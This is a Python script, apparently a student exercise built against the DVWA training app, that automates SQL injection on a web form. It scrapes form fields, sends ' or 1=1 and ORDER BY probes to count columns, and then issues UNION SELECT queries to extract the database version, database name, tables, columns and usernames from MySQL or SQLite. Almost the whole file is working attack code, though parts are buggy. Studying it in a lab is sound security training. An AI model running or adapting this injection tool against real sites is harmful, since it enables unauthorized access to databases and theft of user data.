#!/usr/bin/python3
import argparse
import requests
import re
import os
import difflib

REQUEST_TYPES = set(["get", "post"])

token = os.environ.get('TOKEN')
cookies = {'PHPSESSID': token, "security": "low"}

class Style():
	RED = "\x1b[31m"
	GREEN = "\x1b[32m"
	CYAN = "\x1b[96m"
	RESET = "\033[0m"

def error_exit(msg):
	print(f"Error: {msg}")
	exit(1)

def error_continue(msg):
	print(f"Error: {msg}")

def form_url(url, add):
	if add == "#":
		return url
	if add.startswith('/'):
		if url.endswith('/'):
			url = url[:-1]
		return url + add

	baseurl_match = re.search(r'^(https?://[^/]+)', url)
	if not baseurl_match:
		error_exit(f"worng url - {url}")
	baseurl = baseurl_match.group()
	return baseurl + '/' + add

def log_to_file(str1, str2):
	with open("log.txt", "w") as f:
		f.write(str1)
	with open("log2.txt", "w") as f:
		f.write(str2)

def get_diff(str1, str2):
	diff = difflib.unified_diff(str1.splitlines(), str2.splitlines(), n = 0)
	ret = ""
	cnt = 0
	for d in diff:
		cnt = cnt + 1
		if cnt < 4:
			continue
		if d.startswith("-"):
			continue
		ret = ret + d[1:].strip() + '\n'
	return ret

def get_result(str1, str2, query=""):
	diff = get_diff(str1, str2)
	result = diff.replace("<b>", "")
	result = result.replace("</b>", "")
	result = re.sub('<(.|\n)*?>', '\n', result)
	if query:
		result = result.replace(query, "[query]")
	return result

class Union:
	class UnionException(Exception):
		pass

	def __init__(self, submit, comment):
		print(f"{Style.GREEN}< UNION comment:{comment} >{Style.RESET}")
		self.submit = submit
		self.delimiter = "'"
		self.header = self.delimiter + " UNION "
		self.comment = comment

		self.original_text = self.submit("").text
		self.normal_text = self.submit("' or 1=1" + self.comment).text
		self.column_counts = self.check_num_colums()

		self.mysql = True

	def check_num_colums(self):
		flag = 0
		for i in range(1, 12):
			q = f" ORDER BY {i}"
			query = self.delimiter + q + self.comment
			res = self.submit(query)
			#print(res.text)
			result = get_diff(self.original_text, res.text)
			if res.text and not result:
				flag = 1
				continue
			result = get_diff(self.normal_text, res.text)
			if len(self.normal_text) == len(res.text):
				flag = 1
				continue
			if not result:
				continue
			#print("result", result)
			break
		column_counts = i - flag
		if column_counts == 0 or column_counts >= 10:
			raise self.UnionException("this method does not work")
		print(f"column counts: {column_counts}")
		return column_counts

	def submit_query(self, column_name, contents=""):
		column_lst = ["null"] * (self.column_counts - 1)
		column_lst.append(column_name)
		colums = ", ".join(column_lst)
		query = self.header + "SELECT " + colums + contents + self.comment
		print(f"{Style.CYAN}QUERY: {query}{Style.RESET}")
		return self.submit(query).text, query

	def exec_union(self, column_name, contents):
		response, query = self.submit_query(column_name, contents)
		result = get_result(self.original_text, response, query)
		if not result:
			raise self.UnionException("this method does not work")
		print(result)

	def check_union(self, column_name, compare):
		response, query = self.submit_query(column_name)
		result = get_result(compare, response)
		log_to_file(compare, response)
		#print(result)
		return result

	def get_version(self):
		response, query = self.submit_query("error")
		result = self.check_union("@@version", response)
		if result:
			return
		result = self.check_union("sqlite_version()", response)
		if result:
			self.mysql = False

	def get_database_name(self):
		if self.mysql:
			self.exec_union("DATABASE()", "")
		else:
			self.exec_union("sql", " FROM sqlite_schema")

	def get_table_names(self):
		if self.mysql:
			column_name = "table_name"
			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
		else:
			column_name = "tbl_name"
			contents = " FROM sqlite_master WHERE name='users'"
		self.exec_union(column_name, contents)

	def get_column_names(self):
		if self.mysql:
			column_name = "column_name"
			contents = " FROM information_schema.columns WHERE table_name = 'users'"
		else:
			column_name = "sql"
			contents = " FROM sqlite_master WHERE name='users'"
		self.exec_union(column_name, contents)

	def get_all_data(self):
		# not correct
		if self.mysql:
			column_name = "table_name"
			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
		else:
			column_name = "username"
			contents = " FROM users"
		self.exec_union(column_name, contents)

	def union(self):
		try:
			self.get_version()
			self.get_database_name()
			self.get_table_names()
			self.get_column_names()
			self.get_all_data()
		except self.UnionException as e:
			error_continue(e)
		except Exception as e:
			error_exit(e)

class Vaccine:
	def __init__(self, url, file, method):
		self.url = url
		self.file = file
		self.method = method

		txt = self.request()
		form = self.get_form(txt)
		self.request_url = self.get_request_url(form)
		field = self.get_field_names(form)
		if len(field) > 2:
			self.username_field_name = field[0]
			self.password_field_name = field[1]
		else:
			self.username_field_name = field[0]
			self.password_field_name = None

	def __str__(self):
		return f'''[metadata]
- url: {self.url}
- request-url: {self.request_url}
- method: {self.method}
- username-field: {self.username_field_name}
- password-field: {self.password_field_name}'''

	def get_form(self, txt):
		forms = re.findall(r'(<form(.|\s)*?</form>)', txt)

		if not forms:
			error_exit("form block does not exist")
		filtered_froms = []
		for form in forms:
			method_match = re.search(r'method="(.*?)"', form[0])
			if not method_match:
				continue
			if method_match.group(1).lower() != self.method:
				continue
			filtered_froms.append(form[0])
		#print(forms)
		if not filtered_froms:
			error_exit("method does not match")
		if len(filtered_froms) > 1:
			error_exit("multiple fields exist, cannot determin")
		return filtered_froms[0]

	def get_field_names(self, form):
		return re.findall(r'<input[^>]+name="(.*?)"', form)

	def get_request_url(self, form):
		actions = re.findall(r'<form[^>]+action="(.*?)"', form)
		if not actions:
			return self.url
		if len(actions) > 1:
			error_exit("too many actions found")
		return form_url(self.url, actions[0])

	def request(self):
		try:
			response = requests.get(self.url, cookies=cookies)
		except requests.exceptions.ConnectionError:
			error_exit(f"connection refused - {self.url}")
		except Exception as e:
			error_exit(e)
		if response.status_code == 302:
			error_exit("no cookie found")
			return request()

		if response.status_code != 200:
			error_exit(f"{self.url} - {response}")
		return response.text

	def submit(self, username, password="password"):
		if self.password_field_name:
			payload = {
				self.username_field_name: username,
				self.password_field_name: password
			}
		else:
			payload = {
				self.username_field_name: username,
				"Submit" : "Submit"
			}
		#print(f"payload {payload}")
		res = requests.get(self.request_url, params=payload, cookies=cookies)
		if self.method == "get":
			res = requests.get(self.request_url, params=payload, cookies=cookies)
		elif self.method == "post":
			res = requests.post(self.request_url, data=payload, cookies=cookies)
		return res

	def vaccine(self):
		self.submit("admin", "aaa")
		try:
			u = Union(self.submit, "#")
			u.union()
		except Union.UnionException as e:
			error_continue(e)
		except Exception as e:
			error_exit(e)
		try:
			u2 = Union(self.submit, "--")
			u2.union()
		except Union.UnionException as e:
			error_continue(e)
		except Exception as e:
			error_exit(e)

def validate_args(args):
	if not args.url.startswith('https://') and \
		not args.url.startswith('http://'):
		args.url = 'https://' + args.url
	args.x = args.x.lower()
	if args.x not in REQUEST_TYPES:
		error_exit(f"Request type {args.x} is not supported")

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("url", metavar="URL", type=str)
	parser.add_argument("-o", type=str, default="archive.txt",
		help="Archive file, if not specified it will be stored in a default one.")
	parser.add_argument("-x", type=str, default="GET",
		help="Type of request, if not specified GET will be used.")
	args = parser.parse_args()

	return args

def main():
	args = parse_args()
	validate_args(args)
	vaccine = Vaccine(args.url, args.o, args.x)
	vaccine.vaccine()
	print(vaccine)

if __name__ == '__main__':
	main()
